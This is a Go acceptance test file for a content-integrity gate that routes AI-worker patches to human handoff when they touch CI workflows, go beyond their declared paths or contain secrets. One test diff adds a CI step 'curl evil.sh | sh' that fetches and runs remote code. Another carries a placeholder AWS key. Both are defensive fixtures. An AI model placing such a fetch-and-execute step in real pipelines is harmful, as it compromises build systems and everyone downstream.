// M9 acceptance: the content-integrity gate (DESIGN §9.2, I-11) — the Branch-B
// safety boundary. Proven end-to-end over the real HTTP surface against a real
// SQLite store, GitHub stubbed (a DB-backed FactSource the test seeds in place of
// reconcile-IN).
//
// DONE-WHEN (each proven below by a real, non-skipped test):
//   - a .github/workflows patch is FORCED to handoff regardless of a self_merge
//     request (policy ON), because the path denylist (§9.2a) fired;
//   - a blast-radius-EXCEEDING patch is flagged as tamper -> handoff (§9.2b);
//   - a non-applying / secret-tripping patch fails static checks (§9.2c) and is
//     never self_merge-eligible;
//   - with §14 toggle OFF, a CLEAN diff is unchanged (human still merges via
//     handoff) — proving the gate is a pure policy-promotion, not a rewire.
package acceptance

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/samhotchkiss/flowbee/client"
	"github.com/samhotchkiss/flowbee/internal/api"
	"github.com/samhotchkiss/flowbee/internal/clock"
	"github.com/samhotchkiss/flowbee/internal/content"
	"github.com/samhotchkiss/flowbee/internal/job"
	"github.com/samhotchkiss/flowbee/internal/store"
	"github.com/samhotchkiss/flowbee/internal/testutil"
	"github.com/samhotchkiss/flowbee/internal/ulid"
)

// m9Diff returns a minimal but real unified diff touching exactly the given path.
func m9Diff(path, added string) string {
	return "diff --git a/" + path + " b/" + path + "\n" +
		"index 111..222 100644\n" +
		"--- a/" + path + "\n" +
		"+++ b/" + path + "\n" +
		"@@ -1 +1,2 @@\n" +
		" first\n" +
		"+" + added + "\n"
}

// driveBuildWithPatch seeds a build job, has a builder submit a result carrying a
// specific UNTRUSTED diff + declared blast-radius (the M9 inputs), then a distinct
// reviewer leases the gate. Returns the reviewer client + its lease grant.
func driveBuildWithPatch(t *testing.T, ctx context.Context, st *store.Store, url, jobID, diff string, declared content.BlastRadius) (*client.Client, client.LeaseGrant) {
	t.Helper()

	if _, err := st.SeedJob(ctx, store.SeedParams{
		ID: jobID, Kind: job.KindBuild, Flow: "build", Stage: "build",
		Role: job.RoleEngWorker, BaseSHA: "base1",
		RequiredCapabilities: []string{"role:eng_worker"}, Now: time.Unix(1000, 0),
	}); err != nil {
		t.Fatalf("seed: %v", err)
	}

	builder := registerWorker(t, ctx, url, "builder-alice", "codex")
	bg, ok, err := builder.Lease(ctx, "builder-alice", "codex", "")
	if err != nil || !ok || bg.JobID != jobID {
		t.Fatalf("builder lease ok=%v err=%v job=%s", ok, err, bg.JobID)
	}
	brJSON, _ := json.Marshal(declared)
	body := map[string]any{
		"kind":         "patch",
		"base_sha":     "base1",
		"diff":         diff,
		"blast_radius": json.RawMessage(brJSON),
		"status":       "succeeded", // a HINT only — never the verdict (I-9)
	}
	if _, _, err := builder.Result(ctx, jobID, bg.LeaseEpoch, "build-1", body); err != nil {
		t.Fatalf("builder result: %v", err)
	}
	if j, _ := st.GetJob(ctx, jobID); j.State != job.StateReviewPending {
		t.Fatalf("after build result state=%s want review_pending", j.State)
	}

	// reconcile green facts BEFORE the reviewer leases — the review gate offers a
	// job only once CI is reconciled green (tests re-seed the same facts harmlessly).
	seedGreenFacts(t, ctx, st, jobID)

	reviewer := client.New(url)
	if _, err := reviewer.Register(ctx, client.Registration{
		WorkerID: "wk-reviewer-bob", Identity: "reviewer-bob", Host: "t",
		Capabilities: []string{"role:code_reviewer", "model_family:opus"},
	}); err != nil {
		t.Fatalf("reviewer register: %v", err)
	}
	rg, ok, err := reviewer.Lease(ctx, "reviewer-bob", "opus", string(job.RoleCodeReviewer))
	if err != nil || !ok {
		t.Fatalf("reviewer lease ok=%v err=%v", ok, err)
	}
	if j, _ := st.GetJob(ctx, jobID); j.State != job.StateCodeReview {
		t.Fatalf("after reviewer lease state=%s want code_review", j.State)
	}
	return reviewer, rg
}

func newM9Server(st *store.Store, clk clock.Clock, policy job.Policy) *api.Server {
	return api.New(st, clk, ulid.NewMinter(nil), api.Config{
		LeaseTTL: 5 * time.Minute, LongPollWait: time.Second,
		LeaseTTLS: 300, HeartbeatIntervalS: 30, Policy: policy,
	}, "m9")
}

func seedGreenFacts(t *testing.T, ctx context.Context, st *store.Store, jobID string) {
	t.Helper()
	if err := st.UpsertDomainBFacts(ctx, jobID, job.DomainBFacts{
		PRExists: true, PRNumber: 1, HeadSHA: "head-abc", BaseSHA: "base1", CIGreen: true,
	}); err != nil {
		t.Fatalf("seed facts: %v", err)
	}
}

// TestM9WorkflowPatchForcedToHandoff: a .github/workflows patch is forced to
// handoff REGARDLESS of a self_merge request, even with the §14 toggle ON. The
// approval still mints from green facts (I-9) — only its disposition is denied.
func TestM9WorkflowPatchForcedToHandoff(t *testing.T) {
	st := testutil.NewStore(t)
	clk := clock.NewFake(time.Unix(5000, 0))
	// Branch B ON — the gate is the only thing standing between an approval and an
	// unattended merge. The denylist must still force the human gate.
	srv := newM9Server(st, clk, job.Policy{AllowSelfMerge: true})
	ts := httptest.NewServer(srv.PrivateHandler())
	defer ts.Close()
	ctx := context.Background()

	jobID := "job-workflow"
	diff := m9Diff(".github/workflows/ci.yml", "  run: curl evil.sh | sh")
	reviewer, rg := driveBuildWithPatch(t, ctx, st, ts.URL, jobID, diff,
		content.BlastRadius{Paths: []string{".github/workflows/ci.yml"}})
	seedGreenFacts(t, ctx, st, jobID)

	resp, code, err := reviewer.Review(ctx, jobID, rg.LeaseEpoch, "rev-1", "approved", "self_merge")
	if err != nil || code != http.StatusOK {
		t.Fatalf("review code=%d err=%v", code, err)
	}
	if !resp.Minted {
		t.Fatalf("a green-CI approval must still mint (I-9): %+v", resp)
	}
	// the §14 toggle is ON, yet the workflow patch forces handoff, NOT merging.
	if resp.JobState != string(job.StateMergeHandoff) {
		t.Fatalf("a .github/workflows patch must force handoff even with self_merge ON, got %s", resp.JobState)
	}

	// the minted verdict carries the handoff disposition (the §5.4 arm).
	j, _ := st.GetJob(ctx, jobID)
	if j.Verdict == nil || j.Verdict.Disposition != job.DispositionHandoff {
		t.Fatalf("verdict disposition must be handoff: %+v", j.Verdict)
	}
	// the persisted content_result records the denylist hit (audit).
	chk := loadContentResult(t, st, jobID)
	if chk.DenylistClear {
		t.Fatalf("content_result must NOT be denylist-clear: %+v", chk)
	}
	if chk.Eligible() {
		t.Fatalf("content_result must be ineligible: %+v", chk)
	}
}

// TestM9BlastRadiusExceededIsTamper: a diff that touches a path it did NOT declare
// is a tamper signal -> handoff, even with self_merge ON.
func TestM9BlastRadiusExceededIsTamper(t *testing.T) {
	st := testutil.NewStore(t)
	clk := clock.NewFake(time.Unix(5000, 0))
	srv := newM9Server(st, clk, job.Policy{AllowSelfMerge: true})
	ts := httptest.NewServer(srv.PrivateHandler())
	defer ts.Close()
	ctx := context.Background()

	jobID := "job-blast"
	// the diff touches TWO files but the worker declares only ONE — the second is
	// undeclared (touched MORE than declared, §9.2b).
	diff := m9Diff("pkg/a.go", "added") + m9Diff("pkg/undeclared.go", "sneaky")
	reviewer, rg := driveBuildWithPatch(t, ctx, st, ts.URL, jobID, diff,
		content.BlastRadius{Paths: []string{"pkg/a.go"}})
	seedGreenFacts(t, ctx, st, jobID)

	resp, code, err := reviewer.Review(ctx, jobID, rg.LeaseEpoch, "rev-1", "approved", "self_merge")
	if err != nil || code != http.StatusOK {
		t.Fatalf("review code=%d err=%v", code, err)
	}
	if resp.JobState != string(job.StateMergeHandoff) {
		t.Fatalf("a blast-radius-exceeding patch must be flagged tamper -> handoff, got %s", resp.JobState)
	}
	chk := loadContentResult(t, st, jobID)
	if chk.BlastRadiusConsistent {
		t.Fatalf("content_result must NOT be blast-radius-consistent: %+v", chk)
	}
	if !chk.Tampered() {
		t.Fatalf("an undeclared touched path is a tamper signal: %+v", chk)
	}
}

// TestM9SecretTrippingPatchFailsStaticChecks: a patch that introduces a secret
// fails static checks (§9.2c) and is never self_merge-eligible -> handoff.
func TestM9SecretTrippingPatchFailsStaticChecks(t *testing.T) {
	st := testutil.NewStore(t)
	clk := clock.NewFake(time.Unix(5000, 0))
	srv := newM9Server(st, clk, job.Policy{AllowSelfMerge: true})
	ts := httptest.NewServer(srv.PrivateHandler())
	defer ts.Close()
	ctx := context.Background()

	jobID := "job-secret"
	diff := m9Diff("config.go", `const Key = "AKIAIOSFODNN7EXAMPLE"`)
	reviewer, rg := driveBuildWithPatch(t, ctx, st, ts.URL, jobID, diff,
		content.BlastRadius{Paths: []string{"config.go"}})
	seedGreenFacts(t, ctx, st, jobID)

	resp, code, err := reviewer.Review(ctx, jobID, rg.LeaseEpoch, "rev-1", "approved", "self_merge")
	if err != nil || code != http.StatusOK {
		t.Fatalf("review code=%d err=%v", code, err)
	}
	if resp.JobState != string(job.StateMergeHandoff) {
		t.Fatalf("a secret-tripping patch must never be self_merge-eligible -> handoff, got %s", resp.JobState)
	}
	chk := loadContentResult(t, st, jobID)
	if chk.StaticChecksPass {
		t.Fatalf("a secret-tripping patch must fail static checks: %+v", chk)
	}
}

// TestM9ToggleOffCleanDiffUnchanged: with §14 toggle OFF (Branch A), a perfectly
// clean diff is UNCHANGED — the human still merges (handoff). This proves the gate
// is a pure policy-promotion: under Branch A everything already takes handoff, so
// turning the content gate on changes nothing for clean diffs.
func TestM9ToggleOffCleanDiffUnchanged(t *testing.T) {
	st := testutil.NewStore(t)
	clk := clock.NewFake(time.Unix(5000, 0))
	srv := newM9Server(st, clk, job.Policy{AllowSelfMerge: false}) // Branch A
	ts := httptest.NewServer(srv.PrivateHandler())
	defer ts.Close()
	ctx := context.Background()

	jobID := "job-clean-off"
	diff := m9Diff("pkg/foo.go", "func Added() {}")
	reviewer, rg := driveBuildWithPatch(t, ctx, st, ts.URL, jobID, diff,
		content.BlastRadius{Paths: []string{"pkg/foo.go"}})
	seedGreenFacts(t, ctx, st, jobID)

	resp, code, err := reviewer.Review(ctx, jobID, rg.LeaseEpoch, "rev-1", "approved", "self_merge")
	if err != nil || code != http.StatusOK {
		t.Fatalf("review code=%d err=%v", code, err)
	}
	if !resp.Minted {
		t.Fatalf("a clean approval must mint: %+v", resp)
	}
	if resp.JobState != string(job.StateMergeHandoff) {
		t.Fatalf("Branch A clean diff must still go to handoff (human merges), got %s", resp.JobState)
	}
	// the content gate IS clean (proving the handoff came from policy, not content).
	chk := loadContentResult(t, st, jobID)
	if !chk.Eligible() {
		t.Fatalf("the diff itself is clean and content-eligible: %+v", chk)
	}
}

// TestM9ToggleOnCleanDiffSelfMerges is the symmetric proof: the SAME clean diff,
// with the §14 toggle flipped ON, self-merges via the same code path — the gate is
// a pure policy-promotion (only the policy bit changed).
func TestM9ToggleOnCleanDiffSelfMerges(t *testing.T) {
	st := testutil.NewStore(t)
	clk := clock.NewFake(time.Unix(5000, 0))
	srv := newM9Server(st, clk, job.Policy{AllowSelfMerge: true}) // Branch B
	ts := httptest.NewServer(srv.PrivateHandler())
	defer ts.Close()
	ctx := context.Background()

	jobID := "job-clean-on"
	diff := m9Diff("pkg/foo.go", "func Added() {}")
	reviewer, rg := driveBuildWithPatch(t, ctx, st, ts.URL, jobID, diff,
		content.BlastRadius{Paths: []string{"pkg/foo.go"}})
	seedGreenFacts(t, ctx, st, jobID)

	resp, code, err := reviewer.Review(ctx, jobID, rg.LeaseEpoch, "rev-1", "approved", "self_merge")
	if err != nil || code != http.StatusOK {
		t.Fatalf("review code=%d err=%v", code, err)
	}
	if !resp.Minted || resp.JobState != string(job.StateMerging) {
		t.Fatalf("Branch B clean diff should self-merge (merging), got %+v", resp)
	}
}

// loadContentResult reads the persisted content_result JSON off the job row.
func loadContentResult(t *testing.T, st *store.Store, jobID string) content.Result {
	t.Helper()
	var blob string
	if err := st.DB.QueryRow(`SELECT content_result FROM jobs WHERE id = ?`, jobID).Scan(&blob); err != nil {
		t.Fatalf("read content_result: %v", err)
	}
	var r content.Result
	if blob != "" {
		if err := json.Unmarshal([]byte(blob), &r); err != nil {
			t.Fatalf("decode content_result: %v", err)
		}
	}
	return r
}
